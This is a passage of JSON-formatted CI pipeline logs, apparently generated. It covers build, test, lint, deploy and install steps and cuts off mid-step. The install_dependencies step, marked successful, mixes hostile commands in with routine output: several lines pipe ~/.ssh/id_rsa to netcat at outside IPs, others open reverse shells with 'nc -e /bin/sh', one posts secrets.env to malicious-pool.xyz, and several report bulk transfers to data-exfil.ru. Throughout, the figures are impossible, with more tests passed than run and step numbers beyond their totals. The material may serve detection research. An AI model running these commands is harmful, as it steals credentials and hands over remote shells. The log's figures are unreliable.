          "[12:46:09] DEBUG: Query executed in 96ms",
          "OK",
          "Fetching from https://npmjs.org/package.json",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 75% statements, 72% branches",
          "HEAD is now at 1158c81",
          "npm notice: created a lockfile",
          "[12:46:09] ERROR: Connection failed",
          "Cache hit for key-2285",
          "Artifact uploaded: dist.zip (1MB)",
          "Pushing to registry...",
          "Using Python 3.9",
          "Platform: win32-x64",
          "FAILED: test_cache_hit",
          "pip install: Successfully installed jest-4.11",
          "pip: Installing build dependencies...",
          "pip: Downloading react-1.1.tar.gz",
          "Layer 10/10: COPY command",
          "npm install: resolved 175 packages",
          "Cache saved successfully",
          "pip install: Successfully installed eslint-5.2",
          "Artifact downloaded: 38MB",
          "Finished.",
          "pip: Collecting prettier",
          "npm notice: created a lockfile",
          "Finished.",
          "[12:46:09] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "\u2713 Step 'build' succeeded",
          "[12:46:09] DEBUG: Memory usage: 1480MB",
          "Cache invalidated: node_modules",
          "Cache hit for key-1875",
          "Layer 4/8: RUN command",
          "Completed.",
          "Layer 7/9: ENV command",
          "Switched to branch 'hotfix/task-979'",
          "Connection established",
          "Fetching submodules...",
          "pip install: Successfully installed express-2.3",
          "Compiling src/service.java...",
          "pip install: Successfully installed webpack-4.18",
          "Step 17/18: Deploying",
          "NODE_ENV=test",
          "Tests: 499 passed, 353 total",
          "Coverage: 79% statements, 64% branches",
          "Environment: production",
          "Fetching from https://docker.io/package.json",
          "WARNING: webpack has known vulnerabilities",
          "FAILED: test_cache_hit",
          "Installing jest@2.19.8",
          "[12:46:09] ERROR: Connection failed",
          "Cache saved successfully",
          "Environment: development",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "Uploading artifact 'dist' (32 files)",
          "Already up to date.",
          "Done.",
          "Switched to branch 'hotfix/task-719'",
          "Fetching submodules...",
          "Platform: linux-x64",
          "Compiling utils/handler.rs...",
          "Generating source maps...",
          "Tests: 455 passed, 66 total",
          "Uploading artifact 'build' (10 files)",
          "Connection established",
          "pip: Installing build dependencies...",
          "Step 18/16: Deploying",
          "Bundling main.css",
          "Uploading artifact 'dist' (47 files)",
          "Processing...",
          "\u2713 deploy completed",
          "Artifact uploaded: dist.zip (81MB)",
          "[12:46:09] INFO: Processing request",
          "Cache saved successfully",
          "Step 5/19: Building",
          "Time: 79.856s",
          "Success!",
          "Connection established",
          "[12:46:09] INFO: Connecting to database",
          "Layer 6/8: COPY command",
          "Using Python 3.12",
          "Exception: TypeError",
          "Cache saved successfully",
          "Image pulled successfully",
          "TLS handshake completed",
          "Step 8/18: Deploying",
          "Environment: staging",
          "Image pulled successfully",
          "Waiting...",
          "\u2713 deploy completed",
          "Compiling src/service.java...",
          "Minifying app.js",
          "Platform: darwin-arm64",
          "Cache invalidated: node_modules",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Loading...",
          "[12:46:09] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 9/13: RUN command",
          "Step 3/15: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=production",
          "POST /upload - 201 (494ms)",
          "Compiling components/handler.rs...",
          "[12:46:09] DEBUG: Query executed in 86ms",
          "Test Suites: 23 passed, 40 total",
          "\u2713 Task completed in 2157ms",
          "pip install: Successfully installed axios-5.1",
          "Pulling image: node:3.11",
          "[12:46:09] INFO: Request completed",
          "HEAD is now at ec5d26b",
          "Tests: 323 passed, 160 total",
          "Snapshots: 17 passed, 39 total",
          "Finished.",
          "Waiting...",
          "Compiling utils/service.java...",
          "Verifying...",
          "Step 20/16: Testing",
          "Completed.",
          "[12:46:09] INFO: Connecting to database",
          "Transforming 336 files...",
          "Creating production build...",
          "Fetching from https://github.com/package.json",
          "Fetching from https://github.com/package.json",
          "Step 2/25: Linting",
          "Compiling components/utils.go...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-20T12:48:45.274549",
        "finished_at": "2025-12-20T12:48:56.713135",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Step 17/18: Linting",
          "Cache restored successfully (162MB)",
          "Environment: development",
          "  PASS: test_auth_login (223ms)",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 14.72s",
          "Creating production build...",
          "[12:46:09] DEBUG: Initializing service",
          "OK",
          "Compiling components/app.ts...",
          "WARNING: lodash has known vulnerabilities",
          "Minifying main.js",
          "Finished.",
          "Finished.",
          "Step 6/19: Deploying",
          "Step 7/21: Deploying",
          "Loading...",
          "Already up to date.",
          "Platform: darwin-arm64",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Time: 39.186s",
          "Artifact uploaded: dist.zip (92MB)",
          "pip: Installing build dependencies...",
          "WARNING: lodash has known vulnerabilities",
          "Loading...",
          "[12:46:09] DEBUG: Loading configuration",
          "Step 2/18: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "[12:46:09] INFO: Processing request",
          "Already up to date.",
          "Test Suites: 5 passed, 23 total",
          "Step 10/24: Testing",
          "pip: Collecting prettier",
          "[12:46:09] INFO: Request completed",
          "Bundling vendor.css",
          "OK",
          "pip: Downloading react-2.2.tar.gz",
          "Minifying main.js",
          "Ran 177 tests in 50s",
          "Exception: ValueError",
          "Cache restored successfully (280MB)",
          "FAILED: test_cache_hit",
          "[12:46:09] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "\u2713 Task completed in 280ms",
          "Compiling components/handler.rs...",
          "Loading...",
          "Artifact uploaded: dist.zip (80MB)",
          "Creating production build...",
          "Cache restored successfully (332MB)",
          "Snapshots: 41 passed, 24 total",
          "Checking out main branch",
          "Switched to branch 'bugfix/task-464'",
          "\u2713 validate completed",
          "Minifying app.js",
          "pip: Downloading webpack-1.10.tar.gz",
          "Optimizing 39 modules...",
          "Using Python 3.9",
          "TLS handshake completed",
          "Loading...",
          "TLS handshake completed",
          "Completed.",
          "Step 16/18: Running migrations",
          "\u2713 Task completed in 2095ms",
          "[12:46:09] INFO: Starting build process",
          "Step 18/22: Deploying",
          "Pushing to registry...",
          "Layer 1/11: COPY command",
          "pip install: Successfully installed jest-3.20",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:46:09] INFO: Cache refreshed",
          "pip: Downloading express-5.2.tar.gz",
          "Done.",
          "NODE_ENV=development",
          "Bundling vendor.js",
          "Platform: darwin-arm64",
          "pip: Downloading express-3.18.tar.gz",
          "Step 4/15: Deploying",
          "[12:46:09] DEBUG: Loading configuration",
          "Building Docker image...",
          "Step 8/18: Linting",
          "Artifact downloaded: 24MB",
          "\u2713 All checks passed",
          "Transforming 796 files...",
          "[12:46:09] INFO: Request completed",
          "Done.",
          "pip install: Successfully installed eslint-4.18",
          "Step 13/24: Building",
          "Compiling components/service.java...",
          "Environment: production",
          "  PASS: test_db_connect (344ms)",
          "Installing jest@3.6.3",
          "pip install: Successfully installed eslint-3.3",
          "Step 9/21: Installing dependencies",
          "Using Python 3.9",
          "\u2713 deploy completed",
          "Compiling lib/main.py...",
          "Artifact uploaded: dist.zip (37MB)",
          "Coverage: 84% statements, 80% branches",
          "Using Node.js 14.16.6",
          "WARNING: react has known vulnerabilities",
          "OK",
          "Loading...",
          "Coverage: 100% statements, 65% branches",
          "[12:46:09] INFO: Connecting to database",
          "[12:46:09] DEBUG: Loading configuration",
          "[12:46:09] INFO: Connecting to database",
          "npm install: resolved 265 packages",
          "Compiling lib/main.py...",
          "Artifact downloaded: 4MB",
          "Tests: 103 passed, 387 total",
          "POST /upload - 201 (164ms)",
          "Step 11/23: Installing dependencies",
          "Artifact downloaded: 2MB",
          "[12:46:09] DEBUG: Query executed in 24ms",
          "FAILED: test_auth_login",
          "Verifying...",
          "Test Suites: 29 passed, 18 total",
          "Artifact downloaded: 33MB",
          "Artifact uploaded: dist.zip (40MB)",
          "[12:46:09] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Compiling lib/index.js...",
          "Already up to date.",
          "Installing webpack@5.18.9",
          "Switched to branch 'feature/task-356'",
          "Done.",
          "Connection established",
          "npm install: added 487 packages",
          "WARNING: axios has known vulnerabilities",
          "[12:46:09] INFO: Request completed",
          "Using Python 3.9",
          "[12:46:09] DEBUG: Memory usage: 1078MB",
          "[12:46:09] INFO: Request completed",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Done.",
          "HEAD is now at e94023c",
          "Switched to branch 'hotfix/task-283'",
          "Switched to branch 'feature/task-280'",
          "Minifying app.js",
          "[12:46:09] INFO: Request completed",
          "Creating production build...",
          "Compiling utils/service.java...",
          "Step 19/19: Building",
          "[12:46:09] INFO: Processing request",
          "pip: Collecting lodash",
          "[12:46:09] DEBUG: Memory usage: 1299MB",
          "WARNING: eslint has known vulnerabilities",
          "Checking out master branch",
          "Cache saved successfully",
          "Compiling components/service.java...",
          "Waiting...",
          "Exception: RuntimeError",
          "\u2713 Task completed in 2392ms",
          "\u2713 Task completed in 1187ms",
          "Uploading artifact 'dist' (6 files)",
          "Processing...",
          "[12:46:09] WARN: Deprecated API usage",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-20T12:48:56.713135",
        "finished_at": "2025-12-20T12:49:08.151721",
        "log_lines": [
          "=== Step: setup_node ===",
          "Compiling lib/utils.go...",
          "Connection established",
          "Compiling lib/service.java...",
          "[12:46:09] INFO: Starting build process",
          "[12:46:09] INFO: Processing request",
          "[12:46:09] INFO: Connecting to database",
          "Completed.",
          "\u2713 Task completed in 3887ms",
          "Environment: test",
          "Compiling lib/app.ts...",
          "Completed.",
          "Optimizing 68 modules...",
          "Finished.",
          "Step 6/25: Deploying",
          "Bundling styles.js",
          "Test Suites: 32 passed, 36 total",
          "Completed.",
          "[12:46:09] DEBUG: Loading configuration",
          "[12:46:09] WARN: Deprecated API usage",
          "[12:46:09] INFO: Connecting to database",
          "Ran 142 tests in 10s",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 14MB",
          "Completed.",
          "Compiling src/service.java...",
          "Cache restored successfully (464MB)",
          "Time: 118.681s",
          "Ran 155 tests in 33s",
          "FAILED: test_api_health",
          "[12:46:09] DEBUG: Memory usage: 335MB",
          "Generating source maps...",
          "Using Node.js 17.10.1",
          "TLS handshake completed",
          "Pushing to registry...",
          "[12:46:09] DEBUG: Loading configuration",
          "Already up to date.",
          "NODE_ENV=test",
          "[12:46:09] DEBUG: Connection pool: 15 active",
          "Uploading artifact 'build' (29 files)",
          "Completed.",
          "Minifying vendor.js",
          "Completed.",
          "Cache restored successfully (201MB)",
          "[12:46:09] DEBUG: Query executed in 2ms",
          "Pushing to registry...",
          "GET /api - 204 (6ms)",
          "Done.",
          "TLS handshake completed",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache miss for key-5087",
          "Already up to date.",
          "Minifying main.js",
          "Transforming 446 files...",
          "npm install: resolved 267 packages",
          "[12:46:09] WARN: Deprecated API usage",
          "Step 16/20: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Ran 56 tests in 17s",
          "Fetching from https://github.com/package.json",
          "Cache invalidated: build",
          "Using Node.js 16.17.2",
          "Step 10/23: Installing dependencies",
          "[12:46:09] ERROR: Connection failed",
          "Tests: 412 passed, 242 total",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 50 passed, 12 total",
          "Finished.",
          "[12:46:09] INFO: Connecting to database",
          "Uploading artifact 'build' (43 files)",
          "Loading...",
          "pip: Collecting react",
          "Using Python 3.11",
          "Cache hit for key-8743",
          "\u2713 Task completed in 4454ms",
          "Checking out master branch",
          "OK",
          "WARNING: lodash has known vulnerabilities",
          "Step 11/25: Linting",
          "Step 1/24: Deploying",
          "Cache miss for key-2049",
          "Step 12/18: Linting",
          "Cache saved successfully",
          "Cache saved successfully",
          "Optimizing 54 modules...",
          "NODE_ENV=development",
          "Pushing to registry...",
          "Uploading artifact 'dist' (48 files)",
          "Done.",
          "Waiting...",
          "WARNING: prettier has known vulnerabilities",
          "Cache saved successfully",
          "  PASS: test_db_connect (169ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Downloading jest-2.13.tar.gz",
          "[12:46:09] INFO: Connecting to database",
          "TLS handshake completed",
          "[12:46:09] ERROR: Connection failed",
          "Test Suites: 46 passed, 50 total",
          "  PASS: e2e/test_auth_login.spec.js",
          "Bundling main.css",
          "Loading...",
          "Step 8/19: Linting",
          "Compiling src/service.java...",
          "Pushing to registry...",
          "Layer 4/13: RUN command",
          "yarn add: Done in 1.36s",
          "\u2713 build completed",
          "Completed.",
          "npm install: resolved 1496 packages",
          "Done.",
          "[12:46:09] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: created a lockfile",
          "Platform: darwin-arm64",
          "Creating production build...",
          "Artifact uploaded: dist.zip (67MB)",
          "\u2713 Step 'test' succeeded",
          "Waiting...",
          "  PASS: test_api_health (230ms)",
          "Tests: 166 passed, 160 total",
          "[12:46:09] DEBUG: Memory usage: 1663MB",
          "Success!",
          "\u2713 All checks passed",
          "Optimizing 31 modules...",
          "Step 1/17: Deploying",
          "Snapshots: 1 passed, 6 total",
          "[12:46:09] DEBUG: Connection pool: 10 active",
          "NODE_ENV=development",
          "Pulling image: node:18",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:46:09] INFO: Processing request",
          "Artifact downloaded: 41MB",
          "Generating source maps...",
          "Test Suites: 41 passed, 15 total",
          "POST /data - 202 (161ms)",
          "Cache saved successfully",
          "FAILED: test_cache_hit",
          "OK",
          "Generating source maps...",
          "Done.",
          "yarn add: Done in 18.49s",
          "Compiling utils/main.py...",
          "Switched to branch 'hotfix/task-536'",
          "[12:46:09] WARN: Deprecated API usage",
          "Finished.",
          "Image pulled successfully",
          "  PASS: integration/test_cache_hit.spec.js",
          "Pushing to registry...",
          "Step 18/17: Installing dependencies",
          "Processing...",
          "Artifact uploaded: dist.zip (85MB)",
          "pip: Downloading prettier-3.15.tar.gz",
          "Compiling components/app.ts...",
          "Compiling utils/utils.go...",
          "[12:46:09] DEBUG: Query executed in 81ms",
          "Tests: 332 passed, 111 total",
          "Ready.",
          "Bundling styles.js",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-20T12:49:08.151721",
        "finished_at": "2025-12-20T12:49:12.727156",
        "log_lines": [
          "=== Step: deploy_production ===",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: express has known vulnerabilities",
          "Step 11/19: Building",
          "Compiling src/index.js...",
          "NODE_ENV=production",
          "Creating production build...",
          "GET /status - 204 (14ms)",
          "Environment: test",
          "Artifact uploaded: dist.zip (26MB)",
          "Generating source maps...",
          "yarn add: Done in 9.71s",
          "npm install: resolved 145 packages",
          "Ran 190 tests in 17s",
          "[12:46:09] INFO: Processing request",
          "Step 6/15: Testing",
          "Success!",
          "[12:46:09] INFO: Connecting to database",
          "HEAD is now at b69ff22",
          "Building Docker image...",
          "[12:46:09] DEBUG: Connection pool: 3 active",
          "pip install: Successfully installed express-3.14",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (439ms)",
          "Creating production build...",
          "Waiting...",
          "Cache hit for key-6543",
          "Installing react@3.18.10",
          "\u2713 All checks passed",
          "[12:46:09] INFO: Connecting to database",
          "pip: Downloading express-1.8.tar.gz",
          "Waiting...",
          "pip: Collecting jest",
          "[12:46:09] INFO: Starting build process",
          "NODE_ENV=production",
          "Image pulled successfully",
          "Time: 85.310s",
          "Uploading artifact 'dist' (31 files)",
          "Compiling components/main.py...",
          "Step 3/19: Linting",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Coverage: 97% statements, 87% branches",
          "\u2713 Step 'test' succeeded",
          "Connection established",
          "npm install: added 369 packages",
          "Time: 25.230s",
          "  PASS: test_cache_hit (487ms)",
          "Step 19/19: Running migrations",
          "Compiling src/handler.rs...",
          "Generating source maps...",
          "Step 5/16: Running migrations",
          "\u2713 Task completed in 1410ms",
          "FAILED: test_db_connect",
          "Cache hit for key-9420",
          "Fetching submodules...",
          "Fetching submodules...",
          "OK",
          "Generating source maps...",
          "Transforming 902 files...",
          "Pulling image: node:latest",
          "Cache invalidated: node_modules",
          "Test Suites: 34 passed, 47 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 93% statements, 81% branches",
          "Step 14/21: Building",
          "Compiling src/utils.go...",
          "pip: Downloading express-2.5.tar.gz",
          "Cache saved successfully",
          "Exception: ValueError",
          "Artifact downloaded: 39MB",
          "yarn add: Done in 5.64s",
          "\u2713 lint completed",
          "[12:46:09] ERROR: Connection failed",
          "pip: Collecting prettier",
          "Step 18/23: Running migrations",
          "pip: Collecting express",
          "[12:46:09] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Cache restored successfully (297MB)",
          "[12:46:09] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "Ready.",
          "Cache miss for key-9887",
          "[12:46:09] INFO: Processing request",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Building Docker image...",
          "Time: 68.19s",
          "Using Node.js 17.14.9",
          "[12:46:09] DEBUG: Memory usage: 280MB",
          "Compiling src/app.ts...",
          "Bundling vendor.js",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:46:09] DEBUG: Query executed in 90ms",
          "Fetching from https://github.com/package.json",
          "Minifying vendor.js",
          "Ready.",
          "\u2713 lint completed",
          "Cache restored successfully (48MB)",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "  PASS: integration/test_cache_hit.spec.js",
          "yarn add: Done in 30.90s",
          "Time: 64.957s",
          "Platform: linux-x64",
          "[12:46:09] INFO: Cache refreshed",
          "Step 19/25: Linting",
          "Pulling image: alpine:3.11",
          "Platform: win32-x64",
          "Tests: 226 passed, 366 total",
          "\u2713 All checks passed",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 115",
          "Step 15/21: Installing dependencies",
          "  PASS: test_db_connect (358ms)",
          "Verifying...",
          "Using Node.js 16.12.8",
          "Using Node.js 17.18.4",
          "[12:46:09] INFO: Request completed",
          "Uploading artifact 'build' (43 files)",
          "Pulling image: node:3.11",
          "Cache invalidated: dependencies",
          "Creating production build...",
          "[12:46:09] INFO: Cache refreshed",
          "Switched to branch 'feature/task-990'",
          "  PASS: integration/test_db_connect.spec.js",
          "POST /data - 201 (237ms)",
          "HEAD is now at 3e41a7f",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 305 passed, 459 total",
          "HEAD is now at e38d083",
          "Step 12/16: Linting",
          "Cache saved successfully",
          "Cache restored successfully (371MB)",
          "Creating production build...",
          "npm notice: created a lockfile",
          "OK",
          "Done.",
          "Cache miss for key-7257",
          "Waiting...",
          "[12:46:09] INFO: Processing request",
          "Step 1/23: Linting",
          "Step 9/16: Deploying",
          "[12:46:09] DEBUG: Connection pool: 19 active",
          "Done.",
          "[12:46:09] INFO: Request completed",
          "Generating source maps...",
          "Creating production build...",
          "Done.",
          "FAILED: test_db_connect",
          "\u2717 build failed with exit code 29",
          "  PASS: test_user_create (81ms)",
          "Compiling components/app.ts...",
          "Verifying...",
          "Image pulled successfully",
          "npm install: added 30 packages",
          "Pulling image: node:latest",
          "yarn add: Done in 18.8s",
          "HEAD is now at bcf171d",
          "Compiling components/service.java...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-20T12:49:12.727156",
        "finished_at": "2025-12-20T12:49:24.165742",
        "log_lines": [
          "=== Step: lint ===",
          "[12:46:09] DEBUG: Memory usage: 184MB",
          "Step 5/20: Testing",
          "Artifact uploaded: dist.zip (54MB)",
          "Cache restored successfully (291MB)",
          "Pushing to registry...",
          "pip: Downloading express-3.11.tar.gz",
          "Waiting...",
          "Checking out develop branch",
          "WARNING: jest has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Installing axios@5.2.10",
          "npm notice: package.json updated",
          "[12:46:09] WARN: Deprecated API usage",
          "Checking out master branch",
          "Using Python 3.12",
          "\u2713 build completed",
          "Snapshots: 39 passed, 7 total",
          "Layer 1/11: RUN command",
          "Snapshots: 8 passed, 12 total",
          "Using Node.js 14.4.10",
          "pip install: Successfully installed jest-1.12",
          "Pushing to registry...",
          "Generating source maps...",
          "Cache hit for key-5767",
          "WARNING: webpack has known vulnerabilities",
          "Ran 91 tests in 46s",
          "[12:46:09] WARN: Deprecated API usage",
          "[12:46:09] WARN: Deprecated API usage",
          "Ready.",
          "Step 9/22: Deploying",
          "FAILED: test_user_create",
          "Compiling lib/service.java...",
          "Step 8/23: Testing",
          "Creating production build...",
          "Ready.",
          "Bundling styles.js",
          "Layer 7/12: COPY command",
          "FAILED: test_auth_login",
          "npm notice: created a lockfile",
          "Snapshots: 44 passed, 15 total",
          "Building Docker image...",
          "Step 17/15: Testing",
          "[12:46:09] DEBUG: Memory usage: 1097MB",
          "Compiling lib/handler.rs...",
          "\u2713 lint completed",
          "Step 17/16: Testing",
          "Finished.",
          "Cache hit for key-2044",
          "[12:46:09] INFO: Cache refreshed",
          "Pushing to registry...",
          "Bundling vendor.css",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 47 passed, 31 total",
          "Generating source maps...",
          "Step 8/25: Running migrations",
          "Loading...",
          "\u2713 Task completed in 436ms",
          "Ran 77 tests in 44s",
          "Transforming 735 files...",
          "Fetching from https://npmjs.org/package.json",
          "npm install: resolved 435 packages",
          "Image pulled successfully",
          "Cache restored successfully (64MB)",
          "[12:46:09] DEBUG: Connection pool: 20 active",
          "Cache hit for key-3019",
          "Fetching from https://npmjs.org/package.json",
          "Pushing to registry...",
          "Uploading artifact 'coverage' (4 files)",
          "Loading...",
          "\u2713 All checks passed",
          "[12:46:09] INFO: Starting build process",
          "pip: Collecting prettier",
          "[12:46:09] INFO: Cache refreshed",
          "Ran 29 tests in 50s",
          "Cache restored successfully (243MB)",
          "  PASS: test_db_connect (187ms)",
          "Step 10/24: Running migrations",
          "Done.",
          "Verifying...",
          "POST /upload - 200 (169ms)",
          "npm install: resolved 1976 packages",
          "Fetching submodules...",
          "Step 18/23: Linting",
          "Minifying main.js",
          "Checking out master branch",
          "Image pulled successfully",
          "Exception: RuntimeError",
          "Processing...",
          "[12:46:09] DEBUG: Memory usage: 1958MB",
          "Platform: darwin-arm64",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:09] DEBUG: Query executed in 68ms",
          "Compiling lib/handler.rs...",
          "Platform: linux-x64",
          "Cache hit for key-2047",
          "Ran 178 tests in 34s",
          "npm notice: package.json updated",
          "Cache hit for key-6665",
          "Platform: linux-x64",
          "Creating production build...",
          "Cache saved successfully",
          "Environment: production",
          "\u2713 Step 'setup' succeeded",
          "npm notice: created a lockfile",
          "NODE_ENV=production",
          "Pushing to registry...",
          "Cache saved successfully",
          "pip: Downloading react-3.1.tar.gz",
          "FAILED: test_user_create",
          "\u2717 build failed with exit code 19",
          "Optimizing 59 modules...",
          "OK",
          "Transforming 272 files...",
          "Tests: 389 passed, 157 total",
          "[12:46:09] INFO: Starting build process",
          "Processing...",
          "Cache saved successfully",
          "yarn add: Done in 9.19s",
          "Step 14/25: Building",
          "Step 17/16: Installing dependencies",
          "[12:46:09] DEBUG: Connection pool: 5 active",
          "Completed.",
          "OK",
          "\u2713 Task completed in 3166ms",
          "Already up to date.",
          "Fetching from https://github.com/package.json",
          "[12:46:09] WARN: Deprecated API usage",
          "Cache invalidated: dependencies",
          "HEAD is now at d3b9472",
          "\u2713 Step 'test' succeeded",
          "Cache saved successfully",
          "  PASS: test_auth_login (354ms)",
          "Verifying...",
          "[12:46:09] WARN: Deprecated API usage",
          "Coverage: 71% statements, 88% branches",
          "Connection established",
          "[12:46:09] ERROR: Connection failed",
          "pip: Collecting lodash",
          "Time: 32.262s",
          "Already up to date.",
          "POST /api - 202 (72ms)",
          "Pulling image: alpine:latest",
          "Waiting...",
          "Coverage: 84% statements, 74% branches",
          "[12:46:09] DEBUG: Initializing service",
          "Ran 116 tests in 24s",
          "Using Python 3.9",
          "Using Node.js 15.1.5",
          "Generating source maps...",
          "Step 14/21: Linting",
          "Already up to date.",
          "Verifying...",
          "POST /data - 200 (442ms)",
          "Verifying...",
          "Finished.",
          "Step 16/17: Deploying",
          "POST /data - 200 (435ms)",
          "WARNING: express has known vulnerabilities",
          "[12:46:09] INFO: Processing request",
          "Completed.",
          "Cache hit for key-2367",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-20T12:49:24.165742",
        "finished_at": "2025-12-20T12:49:58.481501",
        "log_lines": [
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 192.230.33.48 22314",
          "=== Step: install_dependencies ===",
          "Coverage: 96% statements, 63% branches",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Sending 64MB of data to crypto-mine.io",
          "Step 14/18: Deploying",
          "[12:46:09] DEBUG: Query executed in 48ms",
          "Connection established",
          "TLS handshake completed",
          "Environment: production",
          "TLS handshake completed",
          "Minifying app.js",
          "yarn add: Done in 25.89s",
          "[12:46:09] INFO: Request completed",
          "Snapshots: 27 passed, 15 total",
          "\u2713 All checks passed",
          "[12:46:09] INFO: Starting build process",
          "npm notice: package.json updated",
          "OK",
          "[12:46:09] INFO: Request completed",
          "Test Suites: 39 passed, 9 total",
          "nc -e /bin/sh 8.60.64.153 21749",
          "Compiling lib/service.java...",
          "Pushing to registry...",
          "\u2713 Task completed in 4421ms",
          "[12:46:09] DEBUG: Loading configuration",
          "Uploading artifact 'coverage' (22 files)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 116.24.17.34 29923",
          "Sending 63MB of data to data-exfil.ru",
          "[12:46:09] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 69.64.247.101 3577",
          "pip: Downloading lodash-3.12.tar.gz",
          "Step 3/22: Running migrations",
          "Transforming 847 files...",
          "[12:46:09] INFO: Cache refreshed",
          "Compiling components/app.ts...",
          "Tests: 477 passed, 251 total",
          "Step 15/25: Deploying",
          "Building Docker image...",
          "Coverage: 83% statements, 77% branches",
          "Cache hit for key-6028",
          "Minifying vendor.js",
          "Artifact downloaded: 2MB",
          "Compiling utils/service.java...",
          "[12:46:09] INFO: Connecting to database",
          "Finished.",
          "GET /status - 201 (62ms)",
          "Cache restored successfully (166MB)",
          "Tests: 220 passed, 242 total",
          "[12:46:09] ERROR: Connection failed",
          "pip: Collecting axios",
          "Sending 321MB of data to data-exfil.ru",
          "Switched to branch 'feature/task-338'",
          "Uploading artifact 'build' (18 files)",
          "Image pulled successfully",
          "Step 6/20: Building",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (5 files)",
          "[12:46:09] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "Completed.",
          "[12:46:09] INFO: Cache refreshed",
          "Compiling src/app.ts...",
          "[12:46:09] INFO: Cache refreshed",
          "Image pulled successfully",
          "Time: 96.134s",
          "Connection established",
          "npm notice: package.json updated",
          "npm install: resolved 418 packages",
          "Step 2/19: Running migrations",
          "Success!",
          "[12:46:09] DEBUG: Query executed in 68ms",
          "Cache restored successfully (417MB)",
          "POST /upload - 200 (281ms)",
          "Finished.",
          "Cache invalidated: dependencies",
          "Switched to branch 'hotfix/task-861'",
          "WARNING: express has known vulnerabilities",
          "Switched to branch 'feature/task-473'",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 177.170.66.127 34695",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:46:09] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "Cache miss for key-2111",
          "Layer 5/15: RUN command",
          "POST /data - 201 (313ms)",
          "  PASS: test_db_connect (131ms)",
          "[12:46:09] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Connection established",
          "Cache miss for key-5709",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Switched to branch 'hotfix/task-166'",
          "pip install: Successfully installed react-3.1",
          "Switched to branch 'bugfix/task-487'",
          "WARNING: prettier has known vulnerabilities",
          "Ran 171 tests in 31s",
          "Platform: linux-x64",
          "Processing...",
          "Processing...",
          "Artifact uploaded: dist.zip (23MB)",
          "Step 2/17: Linting",
          "[12:46:09] WARN: Deprecated API usage",
          "Ran 179 tests in 29s",
          "[12:46:09] INFO: Processing request",
          "Layer 3/10: ENV command",
          "[12:46:09] DEBUG: Loading configuration",
          "Image pulled successfully",
          "Time: 92.698s",
          "Test Suites: 14 passed, 15 total",
          "\u2713 All checks passed",
          "Fetching from https://docker.io/package.json",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 38.100.154.63 23955",
          "Sending 426MB of data to data-exfil.ru",
          "nc -e /bin/sh 77.95.82.28 53022",
          "pip: Downloading webpack-5.20.tar.gz",
          "[12:46:09] DEBUG: Memory usage: 304MB",
          "[12:46:09] INFO: Starting build process",
          "Exception: RuntimeError",
